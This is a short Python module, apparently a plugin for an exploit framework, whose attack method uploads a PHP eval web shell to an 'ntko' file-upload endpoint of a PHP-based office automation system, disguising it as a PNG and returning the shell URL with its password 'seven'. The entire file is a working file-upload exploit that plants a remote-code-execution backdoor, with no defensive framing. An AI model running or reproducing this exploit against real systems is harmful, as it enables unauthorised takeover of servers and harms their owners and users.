#!/usr/bin/env python
# -*- coding: utf-8 -*-

# author: zhangxf55

import sys
import requests
sys.path.append('..')
from models.payload import Payload, PayloadFailException
from configuration import configuration as config
from utils import Utils

class PHPOA(Payload):
    def attack(self):
        shellName = Utils.randmd5() + ".php"
        uploadUrl = "http://{0}/ntko/upLoadOfficeFile.php".format(self.host)
        files = {
            "upLoadFile": ("1.txt", '<?php @eval($_POST[seven]);?>', 'image/png'),
            "attachFile": (shellName, '<?php @eval($_POST[seven]);?>', 'image/png')
        }
        headers = config.headers
        try:
            resp = requests.post(url=uploadUrl, headers=headers, files=files)
            if 200 == resp.status_code:
                shellUrl = "http://{0}/ntko/uploadAttachFile/{1}".format(self.host, shellName)
                return shellUrl, "seven"
            else:
                raise PayloadFailException
        except:
            raise PayloadFailException

